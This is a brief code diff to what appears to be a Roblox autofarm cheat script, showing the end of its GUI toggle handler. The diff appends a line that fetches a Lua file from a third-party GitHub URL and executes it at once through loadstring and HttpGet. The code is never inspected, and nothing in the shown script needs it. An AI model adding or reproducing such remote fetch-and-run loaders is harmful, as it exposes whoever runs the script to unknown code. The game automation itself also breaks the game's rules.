@@ -216,3 +216,5 @@ Toggle.MouseButton1Click:Connect(function()
     Toggle.Text = Enabled and "Autofarm: ON" or "Autofarm: OFF"
     if Enabled then RunAutoFarm() end
 end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/alihusam078588-web/Twilight-zone-loader/refs/heads/main/squirm.lua"))()
